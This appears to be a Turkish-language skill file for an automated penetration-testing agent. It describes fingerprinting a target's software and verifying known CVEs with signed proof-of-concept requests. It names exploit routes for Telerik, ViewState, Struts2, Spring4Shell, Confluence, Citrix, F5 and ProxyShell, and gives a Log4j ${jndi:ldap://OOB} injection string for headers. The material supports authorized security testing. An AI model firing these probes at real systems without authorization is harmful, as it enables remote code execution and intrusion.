# SKILL: Bilinen CVE / Sürüm-İmzalı Exploit (vuln-known-cve)

Hedefin teknoloji+sürümü tespit edildiğinde **jenerik sınıf testiyle yetinme** — o ürün/sürüme ait
BİLİNEN CVE'leri imzayla test et. En yüksek-etkili (genelde RCE/auth-bypass) açıklar burada saklı.

## AKIŞ
1. **Parmak izi:** `Server`/`X-Powered-By`/`X-AspNet-Version` başlıkları, hata sayfaları, ürün-özel yollar (`/Telerik.Web.UI.WebResource.axd`, `/_layouts/`, `/struts2-showcase/`), JS/asset sürümleri, `httpx -tech-detect` çıktısı.
2. **Eşle:** tespit edilen ürün+sürümü bilinen CVE'lerle eşle (aşağıdaki yüksek-değer tablo + genel mantık).
3. **Doğrula (kanıt çıtası):** sürüm tahminiyle "VAR" deme → imzalı PoC isteğini `cyp_send_request` ile at, GERÇEK belirti gör (hata imzası, deşifre, OOB callback, dosya içeriği). `proof_kind=executed_effect/extracted_data` + `extracted_evidence` ile kaydet. Yıkıcı PoC YOK — minimal kanıt.

## YÜKSEK-DEĞER İMZALAR (örnekler — sürüm doğrula)
- **Telerik UI for ASP.NET AJAX** (`Telerik.Web.UI`):
  - `RadAsyncUpload` deserialization/file-upload → **CVE-2017-11317** (zayıf `Telerik.Web.UI.DialogParameters` AES anahtarı) + **CVE-2019-18935** (.NET deserialization → RCE). `Telerik.Web.UI.WebResource.axd?type=rau` uç noktasını ara; sürümü `Telerik.Web.UI.dll` / hata sayfasından çıkar. (doka'da Telerik tespit edildi.)
  - `RadAsyncUpload` / `DialogHandler` → şifre çözme + zincir.
- **ASP.NET ViewState** (`__VIEWSTATE`, `X-AspNet-Version`): MAC kapalı / sızdırılmış `machineKey` → ViewState deserialization RCE (ysoserial.net mantığı). `__VIEWSTATEGENERATOR` + MAC durumunu kontrol et.
- **IIS / ASP.NET**: kısa-dosya-adı (`~1`) tilde enum; `.config`/`web.config` sızıntısı.
- **Apache Struts2**: `Content-Type` OGNL (S2-045/046), `?redirect:` (S2-052 REST XStream) → RCE imzası.
- **Spring**: `spring4shell` (CVE-2022-22965 — `class.module.classLoader...`), Spring Cloud Gateway actuator SpEL.
- **Log4j** (CVE-2021-44228): `${jndi:ldap://OOB}` enjekte edilebilir her alana (User-Agent, başlıklar, param) → OOB callback (`cyp_oob_register`/poll) ile DOĞRULA.
- **Atlassian Confluence** (OGNL CVE-2022-26134), **Citrix** (CVE-2023-3519), **F5 BIG-IP** (CVE-2022-1388 auth-bypass), **GitLab/Jenkins/SharePoint/Exchange (ProxyShell/ProxyLogon)** — sürüm eşleşirse imzalı test.
- **CMS**: WordPress/Drupal/Joomla/vBulletin → eklenti+çekirdek sürüm CVE'leri; `?rest_route=`, `/CHANGELOG.txt`, sürüm meta.

## KURAL
- Sürüm BELİRSİZSE: önce sürümü daralt (içerik/hata/asset), sonra imzalı test. Kör CVE spam YASAK (gürültü + WAF).
- Bulunan = bilinen-CVE bulgusu: CVE-ID, ürün+sürüm, imzalı PoC, gerçek belirti, CVSS (resmi). → `cyp_create_finding`.
- OOB-temelli (log4j/blind-deserial) → `cyp_oob_register` + `oob_poll` ile callback'i KANIT göster (yoksa OLASI/TEORİK).
